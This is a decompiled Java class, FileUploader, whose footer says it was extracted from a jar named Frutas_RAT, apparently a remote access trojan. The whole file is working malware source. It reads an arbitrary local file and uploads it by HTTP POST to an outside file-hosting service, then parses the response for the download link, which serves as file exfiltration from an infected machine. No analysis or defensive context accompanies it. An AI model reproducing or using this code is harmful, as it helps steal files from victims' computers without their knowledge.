/*    */ import java.io.DataInputStream;
/*    */ import java.io.DataOutputStream;
/*    */ import java.io.File;
/*    */ import java.io.FileInputStream;
/*    */ import java.io.IOException;
/*    */ import java.net.HttpURLConnection;
/*    */ import java.net.MalformedURLException;
/*    */ import java.net.URL;
/*    */ 
/*    */ public class FileUploader
/*    */ {
/*    */   public static String upload(String fffffile)
/*    */   {
/* 23 */     HttpURLConnection conn = null;
/* 24 */     DataOutputStream dos = null;
/* 25 */     DataInputStream inStream = null;
/* 26 */     String lineEnd = "\r\n";
/* 27 */     String twoHyphens = "--";
/* 28 */     String boundary = "*****";
/*    */ 
/* 31 */     int maxBufferSize = 1048576;
/* 32 */     String urlString = "http://www5.zippyshare.com/upload";
/*    */     try {
/* 34 */       String strFilename = fffffile;
/*    */       try {
/* 36 */         FileInputStream fileInputStream = new FileInputStream(new File(strFilename));
/*    */ 
/* 38 */         URL url = new URL(urlString);
/* 39 */         conn = (HttpURLConnection)url.openConnection();
/* 40 */         conn.setDoInput(true);
/* 41 */         conn.setDoOutput(true);
/* 42 */         conn.setUseCaches(false);
/* 43 */         conn.setRequestMethod("POST");
/* 44 */         conn.setRequestProperty("Connection", "Keep-Alive");
/* 45 */         conn.setRequestProperty("Content-Type", "multipart/form-data;boundary=" + boundary);
/*    */ 
/* 47 */         dos = new DataOutputStream(conn.getOutputStream());
/* 48 */         dos.writeBytes(twoHyphens + boundary + lineEnd);
/* 49 */         dos.writeBytes("Content-Disposition: form-data; name=\"fupload\"; filename=\"" + strFilename + "\"" + lineEnd);
/*    */ 
/* 51 */         dos.writeBytes(lineEnd);
/* 52 */         int bytesAvailable = fileInputStream.available();
/* 53 */         int bufferSize = Math.min(bytesAvailable, maxBufferSize);
/* 54 */         byte[] buffer = new byte[bufferSize];
/* 55 */         int bytesRead = fileInputStream.read(buffer, 0, bufferSize);
/* 56 */         while (bytesRead > 0) {
/* 57 */           dos.write(buffer, 0, bufferSize);
/* 58 */           bytesAvailable = fileInputStream.available();
/* 59 */           bufferSize = Math.min(bytesAvailable, maxBufferSize);
/* 60 */           bytesRead = fileInputStream.read(buffer, 0, bufferSize);
/*    */         }
/* 62 */         dos.writeBytes(lineEnd);
/* 63 */         dos.writeBytes(twoHyphens + boundary + twoHyphens + lineEnd);
/* 64 */         fileInputStream.close();
/* 65 */         dos.flush();
/* 66 */         dos.close();
/*    */       } catch (MalformedURLException ex) {
/* 68 */         return "Error!";
/*    */       } catch (IOException ioe) {
/* 70 */         return "Error!";
/*    */       }
/*    */     } catch (Exception e) {
/* 73 */       return "Error!";
/*    */     }
/*    */     try {
/* 76 */       inStream = new DataInputStream(conn.getInputStream());
/*    */ 
/* 78 */       String returnd = "";
/*    */       int ii;
/* 79 */       while ((ii = inStream.read()) != -1) {
/* 80 */         returnd = returnd + (char)ii;
/*    */       }
/* 82 */       String toReturn = returnd.substring(returnd.indexOf("<a target=\"top\" href=\"")).replace("<a target=\"top\" href=\"", "");
/* 83 */       toReturn = toReturn.substring(0, toReturn.indexOf("\">"));
/* 84 */       inStream.close();
/* 85 */       return toReturn; } catch (IOException ioex) {
/*    */     }
/* 87 */     return "Error!";
/*    */   }
/*    */ }

/* Location:           C:\Users\Danilo\Desktop\Coisas\Frutas_RAT.jar
 * Qualified Name:     FileUploader
 * JD-Core Version:    0.6.2
 */